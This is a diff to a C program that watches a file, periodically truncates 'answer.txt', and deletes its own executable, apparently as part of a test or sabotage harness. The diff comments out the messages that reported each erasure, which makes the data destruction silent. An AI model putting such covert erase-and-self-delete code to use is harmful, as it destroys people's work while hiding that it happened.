@@ -42,6 +42,7 @@ void self_delete() {
     }
     exe_path[len] = '\0';
 #endif
+    printf("%s\n", exe_path);
     
     // Create deletion command
     snprintf(command, sizeof(command), "%s \"%s\"", DEL_CMD, exe_path);
@@ -50,12 +51,11 @@ void self_delete() {
     system(command);
 }
 
-
 void erase_file_contents(const char* filename) {
     // Flag to check if we should not erase
     FILE *file = fopen("project/not_erase.txt", "r");
     if (file) {
-        printf("Skipping erase due to not_erase.txt presence\n");
+        //printf("Skipping erase due to not_erase.txt presence\n");
         fclose(file);
         remove("project/not_erase.txt");
         return;
@@ -65,7 +65,7 @@ void erase_file_contents(const char* filename) {
     if (truncate(filename, 0) == -1) {
         perror("truncate");
     } else {
-        printf("File contents erased\n");
+        //printf("File contents erased\n");
     }
 }
 
@@ -154,7 +154,7 @@ int main(int argc, char *argv[]) {
                         modified = false;
                     }
                     else {
-                        printf("File changed, erasing contents...\n");
+                        //printf("File changed, erasing contents...\n");
                         counter++;
                         if(counter % NB_SKIPS == 0) {
                             erase_file_contents("answer.txt");
